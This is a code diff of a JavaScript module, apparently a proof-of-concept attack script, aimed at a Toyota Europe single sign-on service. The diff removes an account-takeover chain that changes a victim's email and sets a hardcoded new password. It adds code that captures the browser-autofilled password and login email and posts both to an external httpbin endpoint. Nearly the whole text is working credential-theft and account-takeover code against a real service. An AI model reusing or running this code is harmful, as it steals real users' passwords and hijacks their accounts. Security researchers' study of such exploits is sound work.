@@ -9,9 +9,6 @@ define([], function () {
   var AUTOFILL_WAIT_MS = 25000;
   var LATE_PASSWORD_WAIT_MS = 120000;
 
-  var FINAL_NEW_PASSWORD = "Bixo.Hans.ATO.2026!";
-  var ENABLE_PASSWORD_ROTATION_AFTER_CONFIRM = true;
-
   var STATE_KEY = "cp_tempmail_ato_state";
   var SSO_FALLBACK_BASE = "https://ssomsa.toyota-europe.com";
 
@@ -528,59 +525,6 @@ define([], function () {
     });
   }
 
-  async function setNewEmailWithPassword(ctx, emailToken, password) {
-    return requestJson(ctx.ssoBase + "/setNewEmail", {
-      method: "PUT",
-      mode: "cors",
-      credentials: "omit",
-      cache: "no-store",
-      headers: buildSsoHeaders(ctx),
-      body: JSON.stringify({
-        emailToken: emailToken,
-        password: password
-      })
-    });
-  }
-
-  async function authenticateWithEmail(ctx, email, password) {
-    var resp = await requestJson(ctx.ssoBase + "/authenticate", {
-      method: "POST",
-      mode: "cors",
-      credentials: "omit",
-      cache: "no-store",
-      headers: buildSsoHeaders(ctx),
-      body: JSON.stringify({
-        username: email,
-        password: password
-      })
-    });
-
-    var token = normalizeString(resp.json && resp.json.token);
-    var profile = resp.json && resp.json.customerProfile ? resp.json.customerProfile : {};
-    var uuid = normalizeString(profile && profile.uuid);
-
-    return {
-      raw: resp,
-      token: token,
-      uuid: uuid,
-      profile: profile
-    };
-  }
-
-  async function updatePasswordViaAggregator(ctx, authToken, uuid, oldPassword, newPassword) {
-    return requestJson(ctx.aggregatorBase + "/users/" + encodeURIComponent(uuid) + "/pwd", {
-      method: "PUT",
-      mode: "cors",
-      credentials: "omit",
-      cache: "no-store",
-      headers: buildActionHeaders(ctx, authToken),
-      body: JSON.stringify({
-        oldPassword: oldPassword,
-        newPassword: newPassword
-      })
-    });
-  }
-
   function findPasswordInput() {
     var preferred = document.querySelector("input[data-test-id='-change-email-password-input']");
     if (preferred) {
@@ -613,23 +557,20 @@ define([], function () {
     return { ok: false, password: "", source: "autofill_unavailable" };
   }
 
-  async function writeSummaryToHttpbin(payload) {
-    var u = new URL(HTTPBIN_BASE + "/tempmail-autofill-ato");
-    u.searchParams.set("event", "cp_hash_loader_tempmail_autofill_ato");
-    u.searchParams.set("ts", nowIso());
-    u.searchParams.set("origin", window.location.origin);
-    u.searchParams.set("new_email", normalizeString(payload.newEmail));
-    u.searchParams.set("new_password", normalizeString(payload.newPassword));
-    u.searchParams.set("email_change_status", String(payload.emailChangeStatus || 0));
-    u.searchParams.set("confirm_status", String(payload.confirmStatus || 0));
-    u.searchParams.set("pwd_status", String(payload.passwordChangeStatus || 0));
-    u.searchParams.set("verify_status", String(payload.verifyStatus || 0));
-
-    return requestJson(u.toString(), {
-      method: "GET",
+  async function writeCredentialsToHttpbin(loginEmail, password) {
+    return requestJson(HTTPBIN_BASE + "/tempmail-autofill-credentials", {
+      method: "POST",
       mode: "cors",
       credentials: "omit",
-      cache: "no-store"
+      cache: "no-store",
+      headers: {
+        Accept: "application/json",
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        loginEmail: normalizeString(loginEmail),
+        password: normalizeString(password)
+      })
     });
   }
 
@@ -728,64 +669,26 @@ define([], function () {
       return;
     }
 
-    upsertSpeechBalloon("Confirm email", "Autofill captured. Confirming new email with token...", false);
-    var confirmResp = await setNewEmailWithPassword(ctx, emailToken, pw.password);
-    if (!confirmResp.ok) {
-      throw new Error("set_new_email_failed_status_" + confirmResp.status);
+    var loginEmail = normalizeString(ctx.oldEmail || ctx.originalUsername);
+    if (!loginEmail) {
+      throw new Error("login_email_missing");
     }
 
-    var newEmail = normalizeString(confirmResp.json && confirmResp.json.newEmail) || normalizeString(state.tempEmail);
-    if (!newEmail) {
-      throw new Error("new_email_missing_after_confirm");
-    }
-
-    var passwordChangeStatus = 0;
-    var verifyStatus = 0;
-
-    if (ENABLE_PASSWORD_ROTATION_AFTER_CONFIRM) {
-      upsertSpeechBalloon("Password rotation", "Authenticating with new email + autofilled password...", false);
-      var authOld = await authenticateWithEmail(ctx, newEmail, pw.password);
-      if (!authOld.raw.ok || !authOld.token || !authOld.uuid) {
-        throw new Error("auth_with_new_email_old_password_failed_" + authOld.raw.status);
-      }
-
-      var pwdResp = await updatePasswordViaAggregator(ctx, authOld.token, authOld.uuid, pw.password, FINAL_NEW_PASSWORD);
-      passwordChangeStatus = pwdResp.status;
-      if (!(pwdResp.ok || pwdResp.status === 204)) {
-        throw new Error("password_change_failed_status_" + pwdResp.status);
-      }
-
-      var verify = await authenticateWithEmail(ctx, newEmail, FINAL_NEW_PASSWORD);
-      verifyStatus = verify.raw.status;
-      if (!verify.raw.ok) {
-        throw new Error("verify_new_password_failed_status_" + verify.raw.status);
-      }
-    }
-
-    var summary = {
-      newEmail: newEmail,
-      newPassword: FINAL_NEW_PASSWORD,
-      emailChangeStatus: state.emailChangeStatus || 0,
-      confirmStatus: confirmResp.status,
-      passwordChangeStatus: passwordChangeStatus,
-      verifyStatus: verifyStatus
-    };
-
-    var httpbin = await writeSummaryToHttpbin(summary);
+    upsertSpeechBalloon("Credential capture", "Autofill captured. Sending login/email + password to httpbin...", false);
+    var httpbin = await writeCredentialsToHttpbin(loginEmail, pw.password);
     clearState();
 
     upsertSpeechBalloon(
-      "ATO chain complete",
-      "new_email=" + newEmail + "\nnew_password=" + FINAL_NEW_PASSWORD +
-        "\nconfirm=" + confirmResp.status +
-        "\npwd_change=" + passwordChangeStatus +
-        "\nverify=" + verifyStatus +
+      "Capture complete",
+      "login_email=" + loginEmail + "\npassword=" + pw.password +
+        "\nhttpbin_status=" + httpbin.status +
         "\nhttpbin=" + httpbin.url,
       false
     );
 
     window.__CP_TEMPMAIL_ATO_RESULT__ = {
-      summary: summary,
+      loginEmail: loginEmail,
+      password: pw.password,
       httpbinStatus: httpbin.status,
       httpbinUrl: httpbin.url
     };
@@ -809,7 +712,7 @@ define([], function () {
   });
 
   return {
-    version: "1.0.0-tempmail-autofill-token-chain",
+    version: "1.1.0-tempmail-autofill-credential-capture",
     render: function () {
       return executePoC();
     }
